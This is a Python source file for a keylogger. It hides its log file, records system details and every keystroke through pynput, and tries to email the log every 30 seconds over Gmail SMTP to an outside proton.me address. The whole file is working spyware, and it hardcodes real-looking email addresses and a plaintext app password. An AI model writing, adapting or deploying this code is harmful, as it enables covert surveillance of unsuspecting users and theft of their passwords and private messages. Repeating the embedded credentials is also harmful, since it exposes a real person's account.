import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import platform
import time
from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
import ctypes

# File to save keystrokes
log_file = "keylog.txt"

def create_hidden_file(file_path):
    try:
        with open(file_path, "w") as f:
            pass

        if os.name == 'nt':  # Windows
            FILE_ATTRIBUTE_HIDDEN = 0x02
            result = ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)
            if not result:
                print(f"Failed to set hidden attribute for {file_path}")
        else:  # Unix-based systems
            hidden_file_path = '.' + os.path.basename(file_path)
            os.rename(file_path, hidden_file_path)
    except PermissionError as e:
        print(f"Permission error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

create_hidden_file(log_file)

# Get machine information
current_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
machine_info = f"""
Machine Information:
-------------------
Date: {current_date}
Platform: {platform.platform()}
System: {platform.system()}
Release: {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
"""

# Write machine information to file
try:
    with open(log_file, "a") as f:
        f.write(machine_info + "\n")
except PermissionError as e:
    print(f"Permission error: {e}")
except Exception as e:
    print(f"An error occurred: {e}")

def on_press(key):
    global log_file
    try:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            elif str(key).startswith("Key."):
                f.write(f"\n{key}\n")
            else:
                f.write(str(key).replace("'", ""))
    except Exception as e:
        print(f"An error occurred while logging key press: {e}")

def send_email():
    try:
        message = MIMEMultipart()
        message["From"] = "amineaymenbk12300@gmail.com"
        message["To"] = "AymenBoukadida@proton.me"
        message["Subject"] = "Keylogger Report"

        with open(log_file, 'rb') as f:
            attachment = MIMEBase('application', 'octet-stream')
            attachment.set_payload(f.read())
            encoders.encode_base64(attachment)
            attachment.add_header('Content-Disposition', 'attachment', filename=os.path.basename(log_file))
            message.attach(attachment)

        with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
            smtp.ehlo()
            smtp.starttls()
            smtp.login("amineaymenbk12300@gmail.com", "sdlinunhkitnctwa")
            smtp.send_message(message)
            print("Email sent")
    except Exception as e:
        print(f"An error occurred while sending email: {e}")

if __name__ == "__main__":
    try:
        with Listener(on_press=on_press) as listener:
            while True:
                time.sleep(30)  # Send email every 30 seconds
                send_email()
                listener.join()
    except Exception as e:
        print(f"An error occurred in the main loop: {e}")
